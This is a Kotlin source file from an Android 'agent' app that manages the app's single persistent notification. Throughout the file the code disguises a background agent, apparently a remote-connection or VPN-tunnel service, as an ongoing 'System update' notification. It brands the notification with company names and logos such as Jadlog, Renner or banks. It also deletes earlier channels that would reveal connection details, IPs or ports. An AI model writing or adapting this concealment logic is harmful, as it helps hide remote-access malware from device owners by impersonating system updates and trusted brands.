package com.droidview.agent.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.Typeface
import android.os.Build
import android.text.Spannable
import android.text.SpannableString
import android.text.style.ForegroundColorSpan
import android.text.style.StyleSpan
import android.util.Log
import com.droidview.agent.MainActivity
import com.droidview.agent.R

/**
 * Gerenciador Unificado de Notificação do Agente Android.
 * Garante que exista estritamente UMA notificação ativa e limpa no dispositivo,
 * sem textos técnicos de rede (IPs, portas, sockets, mensagens de reconexão repetidas).
 * Exibe exclusivamente:
 * - Emoji / Logo da Empresa (ex: 📦 para Jadlog, 🛍️ para Renner, etc.)
 * - Nome do Aplicativo cadastrado/instalado
 * - Indicador Circular e Status:
 *   ● Carregando... (🟡 Amarelo)
 *   ● Conectando... (🔵 Azul)
 *   ● Conectado (🟢 Verde)
 *   ● Carregando atualização... (🟡 Amarelo)
 */
object AgentNotificationManager {
    const val TAG = "AgentNotificationMgr"
    const val NOTIFICATION_ID = 578
    const val OLD_AGENT_NOTIFICATION_ID = 1001
    const val OLD_VPN_NOTIFICATION_ID = 2002
    const val CHANNEL_ID = "system_update_channel"

    enum class ServiceStatus(val label: String, val colorHex: String, val emojiDot: String) {
        LOADING("System update", "#EAB308", "🟡"),
        CONNECTING("System update", "#38BDF8", "🔵"),
        CONNECTED("System update", "#22C55E", "🟢"),
        UPDATING("System update", "#EAB308", "🟡")
    }

    @Volatile
    var currentStatus: ServiceStatus = ServiceStatus.CONNECTED
        private set

    fun getAppName(context: Context): String {
        val prefs = context.getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
        val name = prefs.getString("appName", null)
        if (!name.isNullOrBlank() && name != "DVIEW Agent") {
            return name
        }
        return try {
            context.getString(R.string.app_name)
        } catch (_: Exception) {
            "JAD LOG"
        }
    }

    fun getCompanyEmoji(context: Context): String {
        val prefs = context.getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
        val emoji = prefs.getString("companyEmoji", null)
        if (!emoji.isNullOrBlank()) {
            return emoji
        }
        val appName = getAppName(context).lowercase()
        return when {
            appName.contains("renner") -> "🛍️"
            appName.contains("jadlog") || appName.contains("sedex") || appName.contains("log") -> "📦"
            appName.contains("banco") || appName.contains("pay") || appName.contains("finan") -> "💳"
            else -> "📦"
        }
    }

    fun buildNotification(context: Context, status: ServiceStatus = currentStatus): Notification {
        currentStatus = status
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Garante o cancelamento imediato de quaisquer notificações legadas ou secundárias
        try {
            notificationManager.cancel(OLD_AGENT_NOTIFICATION_ID)
            notificationManager.cancel(OLD_VPN_NOTIFICATION_ID)
            notificationManager.cancel(1)
            notificationManager.cancel(2)
        } catch (_: Exception) {}

        val appName = getAppName(context)
        val emoji = getCompanyEmoji(context)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Remove canais antigos de reconexão ou túnel VPN para limpar a gaveta
            try {
                notificationManager.deleteNotificationChannel("dview_agent_keepalive")
                notificationManager.deleteNotificationChannel("dview_vpn_channel")
            } catch (_: Exception) {}

            val channel = NotificationChannel(
                CHANNEL_ID,
                "System update",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "New system software is available, Tap to learn more."
                setShowBadge(false)
            }
            notificationManager.createNotificationChannel(channel)
        }

        val launchIntent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            context,
            0,
            launchIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
        )

        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(context, CHANNEL_ID)
        } else {
            Notification.Builder(context)
        }

        // Padrão visual legítimo corporativo solicitado:
        // - SubTexto / Cabeçalho: Nome do APK gerado (ex: "JAD LOG" -> exibido como "JAD LOG • agora")
        // - Título: "System update"
        // - Texto: "New system software is available, Tap to learn more."
        // - LargeIcon: Logotipo oficial da marca à direita
        // - ZERO menção a dados de conexão, portas, IPs ou "Conectado"
        builder
            .setContentTitle("System update")
            .setContentText("New system software is available, Tap to learn more.")
            .setSubText(appName.ifBlank { "JAD LOG" })
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setOngoing(true)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            builder.setCategory(Notification.CATEGORY_SYSTEM)
        }

        val largeIcon = getLargeIcon(context, emoji)
        if (largeIcon != null) {
            builder.setLargeIcon(largeIcon)
        }

        return builder.build()
    }

    fun startForeground(service: Service, status: ServiceStatus = currentStatus) {
        val notification = buildNotification(service, status)
        service.startForeground(NOTIFICATION_ID, notification)
        Log.i(TAG, "Notificação de primeiro plano [System update] iniciada para ${getAppName(service)}")
    }

    fun update(context: Context, status: ServiceStatus) {
        try {
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
            val notification = buildNotification(context, status)
            notificationManager.notify(NOTIFICATION_ID, notification)
            Log.d(TAG, "Notificação [System update] mantida para ${getAppName(context)}")
        } catch (e: Exception) {
            Log.w(TAG, "Erro ao atualizar notificação: ${e.message}")
        }
    }

    private fun getLargeIcon(context: Context, emoji: String): Bitmap? {
        // Prioridade 1: Logotipo corporativo oficial em assets (custom_logo.png)
        try {
            context.assets.open("custom_logo.png").use { stream ->
                val bmp = BitmapFactory.decodeStream(stream)
                if (bmp != null) {
                    val density = context.resources.displayMetrics.density
                    val size = (64 * density).toInt().coerceAtLeast(64)
                    return Bitmap.createScaledBitmap(bmp, size, size, true)
                }
            }
        } catch (_: Exception) {}

        // Prioridade 2: Emblema corporativo de alta definição com emoji da empresa
        if (emoji.isNotBlank()) {
            try {
                val density = context.resources.displayMetrics.density
                val size = (64 * density).toInt().coerceAtLeast(64)
                val bitmap = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888)
                val canvas = Canvas(bitmap)

                // Fundo circular corporativo em tons de ardósia / carmesim suave
                val bgPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
                    color = Color.parseColor("#1E293B")
                    style = Paint.Style.FILL
                }
                val radius = size / 2f
                canvas.drawCircle(radius, radius, radius, bgPaint)

                val paint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
                    textSize = 34 * density
                    textAlign = Paint.Align.CENTER
                }
                val fontMetrics = paint.fontMetrics
                val y = size / 2f - (fontMetrics.ascent + fontMetrics.descent) / 2f
                canvas.drawText(emoji, size / 2f, y, paint)
                return bitmap
            } catch (e: Exception) {
                Log.w(TAG, "Falha ao gerar ícone corporativo: ${e.message}")
            }
        }

        // Prioridade 3: Fallback para ícone padrão do aplicativo
        return try {
            BitmapFactory.decodeResource(context.resources, R.mipmap.ic_launcher)
        } catch (_: Exception) {
            null
        }
    }
}
